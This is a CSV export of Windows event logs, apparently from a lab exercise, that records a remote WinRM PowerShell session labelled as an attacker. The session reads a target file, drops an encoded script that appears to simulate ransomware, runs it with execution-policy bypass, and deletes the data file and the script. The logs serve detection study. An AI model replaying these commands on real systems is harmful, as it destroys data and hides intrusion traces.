"_time","Activity_Type","host.name","user.name","winlog.event_data.IpAddress","winlog.event_data.Image","winlog.event_data.TargetFilename","winlog.event_data.ScriptBlockText"
"2025-11-16T07:10:37.369+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T07:10:37.430+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:10:38.018+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_gf5v1jnj.t2m.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_gf5v1jnj.t2m.ps1","null
null"
"2025-11-16T07:10:38.725+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:15:19.124+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T07:15:19.159+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:15:24.144+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:15:34.983+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files
'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files
'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:15:39.101+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:19:42.070+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T07:19:42.108+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat data_important.txt
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat data_important.txt
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:19:50.856+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-item 'C:\Program Files\data_important.txt').length
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-item 'C:\Program Files\data_important.txt').length
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:19:50.896+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:19:51.011+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_pnhtzdmw.inp.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_pnhtzdmw.inp.ps1","null
null"
"2025-11-16T07:19:51.271+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 0
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 0
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:19:51.417+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:19:51.537+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_royyegbn.gnb.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_royyegbn.gnb.ps1","null
null"
"2025-11-16T07:19:51.766+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 77
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 77
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:19:51.894+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:20:03.318+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:20:03.494+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_40mef0iq.zpn.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_40mef0iq.zpn.ps1","null
null"
"2025-11-16T07:20:03.814+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""7b9fb1977f73c7229b9e9394a58ce346d746ff6a"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""7b9fb1977f73c7229b9e9394a58ce346d746ff6a"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:20:03.821+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-11-16T07:20:03.866+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-11-16T07:20:03.873+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-11-16T07:20:04.004+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:20:04.013+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Program Files\encrypt.ps1
C:\Program Files\encrypt.ps1","null
null"
"2025-11-16T07:20:04.109+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSByYSBmaWxlIC5lbmNyeXB0ZWQgTeG7mkkKIyBRVUFOIFRS4buMTkc6IEtow7RuZyB4w7NhIGhheSB0aGF5IMSR4buVaSBmaWxlIGfhu5FjLgoKcGFyYW0gKAogICAgIyBOaOG6rW4gdGhhbSBz4buRIGzDoCDEkcaw4budbmcgZOG6q24gZmlsZSBt4bulYyB0acOqdQogICAgW3N0cmluZ10kUGF0aCA9ICJDOlxQcm9ncmFtIEZpbGVzXGRhdGFfaW1wb3J0YW50LnR4dCIKKQoKdHJ5IHsKICAgIFdyaXRlLUhvc3QgIlsqXSBCYXQgZGF1IG1vIHBob25nLi4uIERvYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaWVtIHRyYSBmaWxlIHRvbiB0YWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkxvaTogS2hvbmcgdGltIHRoYXkgZmlsZSBtdWMgdGlldTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgRG9jIG5vaSBkdW5nIGZpbGUKICAgICRjb250ZW50Qnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAKICAgICMgTWEgaG9hIEJhc2U2NCAobW8gcGhvbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIERpbmggbmdoaWEgdGVuIGZpbGUgbW9pCiAgICAkbmV3RW5jcnlwdGVkUGF0aCA9ICRQYXRoICsgIi5lbmNyeXB0ZWQiCiAgICAKICAgICMgR2hpIG5vaSBkdW5nIGRhICJtYSBob2EiIHJhIGZpbGUgbW9pCiAgICBTZXQtQ29udGVudCAtUGF0aCAkbmV3RW5jcnlwdGVkUGF0aCAtVmFsdWUgJGJhc2U2NENvbnRlbnQKICAgIAogICAgV3JpdGUtSG9zdCAiWytdIFRoYW5oIGNvbmchIERhIG1vIHBob25nIG1hIGhvYSBmaWxlLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGdvYyB2YW4gYW4gdG9hbjogJFBhdGgiCiAgICBXcml0ZS1Ib3N0ICJbK10gRmlsZSBtb2kgZGEgdGFvOiAkbmV3RW5jcnlwdGVkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkdhcCBsb2k6ICRfLkV4Y2VwdGlvbi5NZXNzYWdlIgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSByYSBmaWxlIC5lbmNyeXB0ZWQgTeG7mkkKIyBRVUFOIFRS4buMTkc6IEtow7RuZyB4w7NhIGhheSB0aGF5IMSR4buVaSBmaWxlIGfhu5FjLgoKcGFyYW0gKAogICAgIyBOaOG6rW4gdGhhbSBz4buRIGzDoCDEkcaw4budbmcgZOG6q24gZmlsZSBt4bulYyB0acOqdQogICAgW3N0cmluZ10kUGF0aCA9ICJDOlxQcm9ncmFtIEZpbGVzXGRhdGFfaW1wb3J0YW50LnR4dCIKKQoKdHJ5IHsKICAgIFdyaXRlLUhvc3QgIlsqXSBCYXQgZGF1IG1vIHBob25nLi4uIERvYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaWVtIHRyYSBmaWxlIHRvbiB0YWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkxvaTogS2hvbmcgdGltIHRoYXkgZmlsZSBtdWMgdGlldTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgRG9jIG5vaSBkdW5nIGZpbGUKICAgICRjb250ZW50Qnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAKICAgICMgTWEgaG9hIEJhc2U2NCAobW8gcGhvbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIERpbmggbmdoaWEgdGVuIGZpbGUgbW9pCiAgICAkbmV3RW5jcnlwdGVkUGF0aCA9ICRQYXRoICsgIi5lbmNyeXB0ZWQiCiAgICAKICAgICMgR2hpIG5vaSBkdW5nIGRhICJtYSBob2EiIHJhIGZpbGUgbW9pCiAgICBTZXQtQ29udGVudCAtUGF0aCAkbmV3RW5jcnlwdGVkUGF0aCAtVmFsdWUgJGJhc2U2NENvbnRlbnQKICAgIAogICAgV3JpdGUtSG9zdCAiWytdIFRoYW5oIGNvbmchIERhIG1vIHBob25nIG1hIGhvYSBmaWxlLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGdvYyB2YW4gYW4gdG9hbjogJFBhdGgiCiAgICBXcml0ZS1Ib3N0ICJbK10gRmlsZSBtb2kgZGEgdGFvOiAkbmV3RW5jcnlwdGVkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkdhcCBsb2k6ICRfLkV4Y2VwdGlvbi5NZXNzYWdlIgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:20:04.189+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:20:13.822+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:20:23.026+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","rm data_important.txt
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
rm data_important.txt
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:20:31.548+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","rm encrypt.ps1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
rm encrypt.ps1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:20:34.356+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:23:55.773+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T07:23:55.804+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:23:55.921+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_zxj3x1xe.03p.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_zxj3x1xe.03p.ps1","null
null"
"2025-11-16T07:23:56.163+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:23:59.997+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:24:04.554+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:24:10.475+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:24:11.504+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:24:20.210+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
